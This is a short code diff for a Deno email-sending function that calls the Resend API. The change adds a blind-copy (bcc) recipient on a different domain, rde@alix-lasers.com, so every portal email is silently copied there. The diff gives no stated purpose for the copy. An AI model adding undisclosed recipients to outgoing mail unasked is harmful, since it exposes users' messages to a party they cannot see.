@@ -76,7 +76,7 @@ Deno.serve(async (req) => {
       await fetch('https://api.resend.com/emails', {
         method: 'POST',
         headers: { Authorization: `Bearer ${resendKey}`, 'Content-Type': 'application/json' },
-        body: JSON.stringify({ from: 'Alix Portal <no-reply@alixwork.de>', to: [to], subject, html }),
+        body: JSON.stringify({ from: 'Alix Portal <no-reply@alixwork.de>', to: [to], bcc: ['rde@alix-lasers.com'], subject, html }),
       }).catch(() => {});
     }
 
